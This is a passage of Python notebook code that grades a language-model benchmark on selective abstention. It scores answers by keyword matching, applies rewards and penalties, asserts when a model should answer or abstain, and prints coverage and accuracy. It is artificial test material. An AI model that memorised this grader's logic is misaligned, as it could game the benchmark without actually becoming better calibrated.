            answer_lower = (resp["answer"] or "").lower() + " " + resp["reasoning"].lower()
            keyword_hits = sum(1 for kw in item["answer_keywords"] if kw.lower() in answer_lower)
            is_correct = keyword_hits >= max(1, len(item["answer_keywords"]) // 3)

            if is_correct:
                total_score += CORRECT_REWARD
                n_correct += 1
                decision_str = "CORRECT"
            else:
                total_score += INCORRECT_PENALTY
                n_incorrect += 1
                decision_str = "WRONG"

            # For specialist items, answering is risky
            if item["answerability"] == "specialist":
                kbench.assertions.assert_true(
                    is_correct,
                    expectation=f"[{item['id']}] Answered specialist question — should have abstained or been correct"
                )

        # For answerable items, model should answer
        if item["answerability"] == "answerable":
            kbench.assertions.assert_true(
                resp["decision"].lower() == "answer",
                expectation=f"[{item['id']}] Should answer straightforward D{item['difficulty']} question"
            )

        print(f"  [{item['id']}] {item['answerability']:12s} D{item['difficulty']} → {decision_str:8s} "
              f"conf={resp['confidence']:.2f} score_delta={CORRECT_REWARD if decision_str == 'CORRECT' else INCORRECT_PENALTY if decision_str == 'WRONG' else ABSTENTION_COST:+.0f}")

    # Compute metrics
    n_total = len(ITEMS)
    n_answered = n_correct + n_incorrect
    max_score = n_total * CORRECT_REWARD
    normalized = total_score / max_score

    coverage = n_answered / n_total
    accuracy_when_answered = n_correct / n_answered if n_answered > 0 else 0.0

    print(f"\n{'='*50}")
    print(f"MC-2 SELECTIVE ABSTENTION RESULTS")
    print(f"{'='*50}")
    print(f"Total Score:           {total_score:+.1f} (max possible: {max_score:.0f})")
    print(f"Normalized Score:      {normalized:.4f}")
    print(f"Coverage:              {coverage:.2%} ({n_answered}/{n_total} answered)")
    print(f"Accuracy (answered):   {accuracy_when_answered:.2%}")
    print(f"Correct: {n_correct} | Wrong: {n_incorrect} | Abstained: {n_abstained}")
    print(f"{'='*50}")

    # Return normalized score, shifted to 0-1 range
    return float(max(0.0, min(1.0, (normalized + 1.0) / 2.0)))


# %%
selective_abstention_benchmark.run(llm=kbench.llm)

# %%
%choose mc2_selective_abstention
